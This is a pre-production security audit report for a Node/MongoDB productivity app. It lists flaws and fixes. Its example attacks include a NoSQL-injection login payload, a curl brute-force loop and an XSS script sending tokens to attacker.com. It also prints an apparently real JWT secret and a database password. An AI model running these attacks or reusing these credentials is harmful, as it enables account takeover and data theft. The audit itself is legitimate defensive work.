# 🔒 PRE-PRODUCTION SECURITY AUDIT REPORT

**Application:** Momentum Productivity Tracker  
**Audit Date:** February 4, 2026  
**Auditor:** Senior Security Engineer  
**Severity Scale:** 🔥 Critical | ⚠️ Medium | ✅ Secure

---

## 🔥 CRITICAL VULNERABILITIES (FIX IMMEDIATELY)

### 1. ⚠️ STACK TRACES EXPOSED IN PRODUCTION

**File:** `backend/src/middleware/error.middleware.ts`

**Current Code:**
```typescript
export const errorMiddleware = (err: Error, _req: Request, res: Response, _next: NextFunction) => {
  logger.error(err.message);
  res.status(500).json({ message: err.message }); // ❌ EXPOSES ERROR DETAILS
};
```

**Risk:** Attackers can learn about your internal structure, database schema, file paths, and dependencies.

**Exploit Example:**
```bash
# Attacker sends malformed request
POST /api/auth/login
{ "email": "test@test.com", "password": { "$ne": null } }

# Response reveals MongoDB details:
{
  "message": "Cast to string failed for value..."
}
```

**Fix:**
```typescript
export const errorMiddleware = (err: Error, _req: Request, res: Response, _next: NextFunction) => {
  logger.error(err.stack || err.message); // Log full details for debugging
  
  // Never expose error details in production
  if (process.env.NODE_ENV === 'production') {
    res.status(500).json({ 
      success: false,
      message: 'An internal server error occurred' 
    });
  } else {
    res.status(500).json({ 
      success: false,
      message: err.message,
      stack: err.stack // Only in development
    });
  }
};
```

---

### 2. 🔥 JWT SECRET STORED IN .env FILE (COMMITTED TO GIT)

**File:** `backend/.env`

**Issue:** Your `.env` file contains actual secrets and was previously committed to GitHub.

**Current JWT Secret (EXPOSED):**
```
JWT_SECRET=ee917e2f04a341b692c9304e679b1d37c0bc5f51508aae80611199625e1b52cd110eee16541c32fb82c2fa0adbb8c4577ba8b39c934b41065c3245cacb20874d
```

**Risk:** Anyone with repo access (or who saw the leaked commit) can:
- Forge JWT tokens
- Impersonate any user
- Access any account
- Bypass all authentication

**Immediate Actions:**

1. **Rotate ALL secrets NOW:**
```bash
# Generate new secrets
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
```

2. **Update Vercel environment variables:**
```bash
# Set in Vercel Dashboard > Settings > Environment Variables
JWT_SECRET=<new-secret-here>
JWT_REFRESH_SECRET=<new-secret-here>
GOOGLE_CLIENT_SECRET=<new-secret-here>
```

3. **Revoke and regenerate Google OAuth credentials:**
- Go to https://console.cloud.google.com/apis/credentials
- Delete current OAuth 2.0 Client
- Create new credentials
- Update `GOOGLE_CLIENT_ID` and `GOOGLE_CLIENT_SECRET` everywhere

4. **Force logout all users:**
```javascript
// All existing tokens are now invalid with new JWT_SECRET
// Users will need to login again
```

---

### 3. 🔥 MONGODB CONNECTION STRING EXPOSED

**Risk:** Your MongoDB Atlas connection string contains credentials and was committed to git history.

**Current:**
```
MONGODB_URI=mongodb+srv://rishabh292002_db_user:8mCauGsER4KzDeRc@momentum-cluster...
```

**Immediate Actions:**

1. **Rotate MongoDB user password:**
```bash
# In MongoDB Atlas Dashboard:
# 1. Database Access > Select user > Edit
# 2. Edit Password > Autogenerate Secure Password
# 3. Update Password
# 4. Copy new connection string
```

2. **Update everywhere:**
- Vercel backend env vars
- Local `.env` (do NOT commit)

---

### 4. ⚠️ NO RATE LIMITING ON AUTH ROUTES

**File:** `backend/src/modules/auth/auth.routes.ts`

**Current Code:**
```typescript
router.post("/register", register);
router.post("/login", login); // ❌ NO RATE LIMITING
```

**Risk:** Brute force attacks against user accounts.

**Exploit:**
```bash
# Attacker tries 10,000 password combinations
for i in {1..10000}; do
  curl -X POST https://your-api.com/api/auth/login \
    -d "email=victim@email.com&password=test$i"
done
```

**Fix:**
```typescript
import { authRateLimiter } from "../../middleware/rate-limiter.middleware";

const router = Router();

// Apply strict rate limiting to auth endpoints
router.post("/register", authRateLimiter, register);
router.post("/login", authRateLimiter, login);
```

---

### 5. ⚠️ CORS ALLOWS ALL VERCEL DEPLOYMENTS

**File:** `backend/src/app.ts`

**Current:**
```typescript
app.use(cors({
  origin: [
    'http://localhost:5173',
    'https://momentum12.vercel.app',
    /\.vercel\.app$/  // ❌ ALLOWS ANY VERCEL APP!
  ],
  credentials: true
}));
```

**Risk:** ANY Vercel app can make authenticated requests to your API.

**Exploit:**
1. Attacker creates `evil-app.vercel.app`
2. Victim visits attacker's site (logged into your app)
3. Attacker's JavaScript makes API calls with victim's cookies/tokens
4. Attacker steals data or performs actions

**Fix:**
```typescript
app.use(cors({
  origin: [
    process.env.NODE_ENV === 'development' ? 'http://localhost:5173' : null,
    'https://momentum12.vercel.app',
    // Only allow YOUR specific preview deployments
    /^https:\/\/momentum12-.*\.vercel\.app$/
  ].filter(Boolean),
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400 // 24 hours cache
}));
```

---

### 6. ⚠️ JWT TOKENS STORED IN LOCALSTORAGE (XSS RISK)

**Files:** 
- `frontend/src/contexts/UserContext.tsx`
- `frontend/src/services/api.ts`

**Current:**
```typescript
localStorage.setItem("token", data.token); // ❌ VULNERABLE TO XSS
```

**Risk:** If any XSS vulnerability exists in your app, attacker can steal tokens:
```javascript
// Attacker injects this script
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))
</script>
```

**Recommended Fix (HttpOnly Cookies):**

**Backend changes:**
```typescript
// backend/src/modules/auth/auth.controller.ts
export const login = async (req: Request, res: Response) => {
  try {
    const result = await loginUser(email, password);
    
    // Set HttpOnly cookie (NOT accessible via JavaScript)
    res.cookie('accessToken', result.token, {
      httpOnly: true,  // Prevents JavaScript access
      secure: process.env.NODE_ENV === 'production', // HTTPS only in prod
      sameSite: 'lax', // CSRF protection
      maxAge: 15 * 60 * 1000, // 15 minutes
      path: '/'
    });
    
    res.cookie('refreshToken', result.refreshToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      maxAge: 30 * 24 * 60 * 60 * 1000, // 30 days
      path: '/'
    });
    
    res.status(200).json({
      success: true,
      message: 'Login successful',
      user: result.user
      // Don't send token in response body
    });
  } catch (error: any) {
    // ...
  }
};
```

**Frontend changes:**
```typescript
// frontend/src/contexts/UserContext.tsx
const login = async (email: string, password: string) => {
  try {
    setLoading(true);
    setError(null);
    const data = await loginService(email, password);
    // NO localStorage - cookies are set automatically
    
    // Fetch user profile
    await fetchUserProfile();
  } catch (err: any) {
    // ...
  }
};

// frontend/src/services/api.ts
const api = axios.create({
  baseURL: env.API_URL,
  withCredentials: true // Send cookies with requests
});

// No need for Authorization header interceptor
// Cookies are sent automatically
```

**Auth middleware update:**
```typescript
// backend/src/middleware/auth.middleware.ts
export const authMiddleware = (req: AuthRequest, res: Response, next: NextFunction) => {
  // Try Authorization header first (for mobile apps)
  let token = req.headers.authorization?.split(" ")[1];
  
  // Fall back to cookies (for web)
  if (!token) {
    token = req.cookies.accessToken;
  }
  
  if (!token) {
    return res.status(401).json({ message: "Unauthorized" });
  }
  
  try {
    const decoded = jwt.verify(token, env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch {
    res.status(401).json({ message: "Invalid token" });
  }
};
```

**Install cookie-parser:**
```bash
cd backend
npm install cookie-parser @types/cookie-parser
```

```typescript
// backend/src/app.ts
import cookieParser from 'cookie-parser';

app.use(cookieParser());
app.use(express.json());
```

---

### 7. ⚠️ NO INPUT VALIDATION

**Risk:** SQL/NoSQL injection, buffer overflows, DoS attacks.

**Install validation library:**
```bash
cd backend
npm install express-validator
```

**Update auth controller:**
```typescript
// backend/src/modules/auth/auth.controller.ts
import { body, validationResult } from 'express-validator';

export const loginValidation = [
  body('email')
    .isEmail().withMessage('Valid email required')
    .normalizeEmail()
    .trim(),
  body('password')
    .isLength({ min: 8, max: 128 }).withMessage('Password must be 8-128 characters')
    .trim()
];

export const registerValidation = [
  body('name')
    .isLength({ min: 2, max: 100 }).withMessage('Name must be 2-100 characters')
    .trim()
    .escape(),
  body('email')
    .isEmail().withMessage('Valid email required')
    .normalizeEmail()
    .trim(),
  body('password')
    .isLength({ min: 8 }).withMessage('Password must be at least 8 characters')
    .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/).withMessage('Password must contain uppercase, lowercase, and number')
    .trim()
];

export const login = async (req: Request, res: Response, next: NextFunction) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ 
      success: false,
      errors: errors.array() 
    });
  }
  
  // ... rest of login logic
};
```

**Update routes:**
```typescript
// backend/src/modules/auth/auth.routes.ts
import { register, login, loginValidation, registerValidation } from "./auth.controller";

router.post("/register", authRateLimiter, registerValidation, register);
router.post("/login", authRateLimiter, loginValidation, login);
```

---

### 8. 🔥 NO HELMET FOR SECURITY HEADERS

**Risk:** Missing security headers allow various attacks.

**Install and configure:**
```bash
cd backend
npm install helmet
```

```typescript
// backend/src/app.ts
import helmet from 'helmet';

export const app = express();

// Add security headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  },
  frameguard: { action: 'deny' },
  noSniff: true,
  xssFilter: true
}));

app.use(cors({...}));
```

---

### 9. ⚠️ OAUTH STATE TOKEN STORED IN MEMORY

**File:** `backend/src/modules/oauth/oauth.controller.ts`

**Current:**
```typescript
const stateStore = new Map<string, { createdAt: number; ... }>(); // ❌ LOST ON RESTART
```

**Risk:** In serverless (Vercel), each function invocation is isolated. State tokens won't persist across requests.

**Fix (Use Redis for production):**
```typescript
import { createClient } from 'redis';

const redisClient = process.env.REDIS_URL ? createClient({ url: process.env.REDIS_URL }) : null;

if (redisClient) {
  redisClient.connect();
}

async function storeState(state: string, data: any) {
  if (redisClient) {
    // Store in Redis with 10min expiry
    await redisClient.setEx(`oauth:state:${state}`, 600, JSON.stringify(data));
  } else {
    // Fallback to memory (dev only)
    stateStore.set(state, data);
  }
}

async function getState(state: string) {
  if (redisClient) {
    const data = await redisClient.get(`oauth:state:${state}`);
    return data ? JSON.parse(data) : null;
  } else {
    return stateStore.get(state);
  }
}

async function deleteState(state: string) {
  if (redisClient) {
    await redisClient.del(`oauth:state:${state}`);
  } else {
    stateStore.delete(state);
  }
}
```

---

## ⚠️ MEDIUM SEVERITY ISSUES

### 10. MongoDB Injection Prevention

**Add to auth service:**
```typescript
// backend/src/modules/auth/auth.service.ts
export const loginUser = async (email: string, password: string) => {
  // Ensure email is a string, not an object
  if (typeof email !== 'string' || typeof password !== 'string') {
    throw new Error('Invalid credentials');
  }
  
  const user = await User.findOne({ 
    email: email.toLowerCase().trim() 
  });
  // ...
};
```

---

### 11. Add CSRF Protection for Cookie-Based Auth

```bash
npm install csurf
```

```typescript
// backend/src/app.ts
import csrf from 'csurf';

const csrfProtection = csrf({ cookie: true });

// Apply to state-changing routes
app.use('/api/auth', csrfProtection);
app.use('/api/tasks', csrfProtection);
// etc.

// Send CSRF token to frontend
app.get('/api/csrf-token', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});
```

---

### 12. Implement Account Lockout

**Add to User model:**
```typescript
// backend/src/modules/auth/auth.model.ts
export interface IUser extends Document {
  // ... existing fields
  failedLoginAttempts: number;
  accountLockedUntil?: Date;
}

const userSchema = new Schema({
  // ... existing fields
  failedLoginAttempts: { type: Number, default: 0 },
  accountLockedUntil: { type: Date }
});
```

**Update login service:**
```typescript
export const loginUser = async (email: string, password: string) => {
  const user = await User.findOne({ email: email.toLowerCase() });
  if (!user) throw new Error("User not found");
  
  // Check if account is locked
  if (user.accountLockedUntil && user.accountLockedUntil > new Date()) {
    throw new Error(`Account locked. Try again after ${user.accountLockedUntil.toLocaleTimeString()}`);
  }
  
  if (!user.password) {
    throw new Error("This account uses OAuth. Please login with your OAuth provider.");
  }
  
  const isMatch = await bcrypt.compare(password, user.password);
  
  if (!isMatch) {
    // Increment failed attempts
    user.failedLoginAttempts += 1;
    
    // Lock account after 5 failed attempts
    if (user.failedLoginAttempts >= 5) {
      user.accountLockedUntil = new Date(Date.now() + 30 * 60 * 1000); // 30 minutes
    }
    
    await user.save();
    throw new Error("Invalid credentials");
  }
  
  // Reset failed attempts on successful login
  user.failedLoginAttempts = 0;
  user.accountLockedUntil = undefined;
  await user.save();
  
  // ... generate token
};
```

---

### 13. Add Request Logging for Security Monitoring

```bash
npm install morgan
```

```typescript
// backend/src/app.ts
import morgan from 'morgan';

if (process.env.NODE_ENV === 'production') {
  app.use(morgan('combined', {
    skip: (req, res) => res.statusCode < 400, // Only log errors
    stream: {
      write: (message) => logger.info(message.trim())
    }
  }));
}
```

---

### 14. Implement Refresh Token Rotation

**Current risk:** If refresh token is stolen, attacker has indefinite access.

**Fix:**
```typescript
// backend/src/modules/auth/refresh.controller.ts
export const refreshAccessToken = async (req: Request, res: Response) => {
  const { refreshToken } = req.cookies;
  
  if (!refreshToken) {
    return res.status(401).json({ message: 'No refresh token' });
  }
  
  try {
    const decoded = jwt.verify(refreshToken, env.JWT_REFRESH_SECRET);
    
    // Generate NEW access AND refresh tokens
    const newAccessToken = generateToken(decoded.userId, decoded.role);
    const newRefreshToken = generateRefreshToken(decoded.userId);
    
    // Invalidate old refresh token (store in Redis blacklist)
    if (redisClient) {
      await redisClient.setEx(
        `blacklist:${refreshToken}`,
        30 * 24 * 60 * 60, // 30 days
        'revoked'
      );
    }
    
    // Set new cookies
    res.cookie('accessToken', newAccessToken, { ...cookieOptions });
    res.cookie('refreshToken', newRefreshToken, { ...cookieOptions });
    
    res.json({ success: true });
  } catch (error) {
    res.status(401).json({ message: 'Invalid refresh token' });
  }
};
```

---

## ✅ WHAT'S ALREADY SECURE

1. ✅ **MongoDB Atlas Network Security** - Requires IP whitelisting
2. ✅ **OAuth Backend-Only Flow** - Client secret never exposed to frontend
3. ✅ **Rate Limiting Infrastructure** - Redis-based distributed rate limiting
4. ✅ **Protected Routes** - Auth middleware on sensitive endpoints
5. ✅ **Password Hashing** - bcrypt with salt rounds
6. ✅ **JWT with Expiration** - Tokens expire (15min access, 30d refresh)
7. ✅ **.env in .gitignore** - Environment files not committed (going forward)
8. ✅ **HTTPS Enforcement** - Vercel provides SSL certificates
9. ✅ **Serverless Architecture** - Reduces attack surface

---

## 🔐 COMPLETE FIX IMPLEMENTATION

Apply all fixes in this order:

### Step 1: Rotate All Secrets (IMMEDIATE)
```bash
# 1. Generate new JWT secrets
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"

# 2. Update Vercel env vars
# Go to: https://vercel.com/dashboard
# Project > Settings > Environment Variables
# Update:
# - JWT_SECRET
# - JWT_REFRESH_SECRET
# - MONGODB_URI (after rotating password)
# - GOOGLE_CLIENT_ID (after regenerating)
# - GOOGLE_CLIENT_SECRET (after regenerating)

# 3. Redeploy
vercel --prod
```

### Step 2: Install Security Dependencies
```bash
cd backend
npm install helmet express-validator cookie-parser morgan csurf @types/cookie-parser @types/morgan
```

### Step 3: Apply Code Fixes
Use the code examples above to update:
- ✅ Error middleware (hide stack traces)
- ✅ Auth routes (add rate limiting)
- ✅ CORS configuration (restrict origins)
- ✅ Add Helmet middleware
- ✅ Add input validation
- ✅ Switch to HttpOnly cookies
- ✅ Add CSRF protection
- ✅ Implement account lockout
- ✅ Add request logging

### Step 4: Update Frontend
- ✅ Remove localStorage token storage
- ✅ Add withCredentials to axios
- ✅ Remove Authorization header interceptor

### Step 5: Test Everything
```bash
# Test auth flow
# Test rate limiting
# Test protected routes
# Test OAuth flow
# Test error handling
```

---

## 🧪 SELF-VERIFICATION CHECKLIST

### Authentication Security
- [ ] Login with wrong password 5 times → Account locked
- [ ] Try accessing `/api/tasks` without token → 401 Unauthorized
- [ ] JWT token expires after 15 minutes → Requires refresh
- [ ] Logout clears cookies
- [ ] Can't access login page while authenticated

### API Security
- [ ] CORS blocks requests from `https://evil-site.com`
- [ ] Rate limiter blocks after 5 login attempts in 15min
- [ ] Error responses don't expose stack traces in production
- [ ] All API routes require authentication except `/api/auth/*` and `/api/oauth/*`

### OAuth Security
- [ ] OAuth state token validates CSRF
- [ ] Google Client Secret never appears in frontend code
- [ ] OAuth callback URL matches registered redirect URI
- [ ] Can't login via OAuth if account doesn't exist (only register)

### Input Validation
- [ ] Registration with email `<script>alert(1)</script>` fails
- [ ] Password with only lowercase characters fails validation
- [ ] Name with 200 characters fails validation

### Headers & Cookies
- [ ] Response includes `X-Frame-Options: DENY`
- [ ] Response includes `Strict-Transport-Security`
- [ ] Cookies have `HttpOnly` and `Secure` flags
- [ ] Frontend can't access cookies via JavaScript

---

## 📋 FINAL PRODUCTION SECURITY CHECKLIST

Before going live:

### Secrets & Environment
- [ ] All secrets rotated after git leak
- [ ] No secrets in code or comments
- [ ] `.env` in `.gitignore`
- [ ] Environment variables set in Vercel
- [ ] MongoDB password rotated
- [ ] Google OAuth credentials regenerated

### Authentication
- [ ] Rate limiting on auth routes (5 req/15min)
- [ ] Account lockout after 5 failed attempts
- [ ] Tokens stored in HttpOnly cookies (not localStorage)
- [ ] JWT tokens expire (15min access, 30d refresh)
- [ ] Refresh token rotation implemented
- [ ] CSRF protection enabled

### API Security
- [ ] All routes except auth require authentication
- [ ] Input validation on all endpoints
- [ ] CORS restricted to your domain only
- [ ] Helmet middleware installed
- [ ] Error messages don't leak sensitive info
- [ ] Request logging for security monitoring

### Database
- [ ] MongoDB Atlas IP whitelist configured
- [ ] Database user has minimal permissions
- [ ] Connection string uses TLS/SSL
- [ ] No admin credentials used in app

### OAuth
- [ ] OAuth flow backend-only
- [ ] State tokens stored in Redis (not memory)
- [ ] Redirect URI validated
- [ ] No auto-registration on login

### Deployment
- [ ] HTTPS enforced (Vercel handles this)
- [ ] Production error handling (no stack traces)
- [ ] Health check endpoint: `/api/health`
- [ ] Monitoring and alerting configured
- [ ] Regular security audits scheduled

---

## 🎯 PRIORITY ACTION PLAN

**TODAY (Critical):**
1. Rotate JWT secrets
2. Rotate MongoDB password
3. Regenerate Google OAuth credentials
4. Update all Vercel environment variables
5. Fix error middleware (hide stack traces)

**THIS WEEK (High Priority):**
6. Implement HttpOnly cookies
7. Add rate limiting to auth routes
8. Fix CORS configuration
9. Add Helmet middleware
10. Add input validation

**THIS MONTH (Medium Priority):**
11. Implement account lockout
12. Add refresh token rotation
13. Set up security monitoring
14. Add CSRF protection
15. Regular security testing

---

## 📞 INCIDENT RESPONSE

If secrets are compromised:

1. **Immediately rotate ALL secrets**
2. **Force logout all users** (invalidate all tokens)
3. **Check audit logs** for suspicious activity
4. **Notify affected users** if data breach occurred
5. **Document the incident**
6. **Review and patch** the vulnerability
7. **Implement additional monitoring**

---

**Final Note:** Security is an ongoing process. Schedule quarterly security audits and penetration testing. Consider hiring a professional security firm for comprehensive assessment before major launches.

**Audit Status:** 🔴 NOT PRODUCTION READY - Critical vulnerabilities identified. Apply all fixes before deployment.
